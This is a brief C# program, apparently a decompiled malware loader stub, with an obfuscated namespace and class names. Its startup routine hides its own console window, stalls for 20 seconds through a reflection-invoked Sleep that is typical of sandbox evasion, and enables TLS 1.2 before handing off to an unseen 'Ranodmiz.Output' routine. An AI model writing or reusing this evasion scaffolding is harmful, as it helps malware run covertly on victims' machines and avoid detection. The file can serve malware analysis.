using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace Xsocnyhdhtvskusfwvgz;

internal class Program
{
	[STAThread]
	private static void Main()
	{
		Up();
		Ranodmiz.Output();
	}

	private static void Up()
	{
		NativeMethod.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
		DateTime now = DateTime.Now;
		while (DateTime.Now < now.AddSeconds(20.0))
		{
			typeof(Thread).GetMethod("Sleep", new Type[1] { typeof(int) })!.Invoke(null, new object[1] { 999 });
		}
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
	}
}
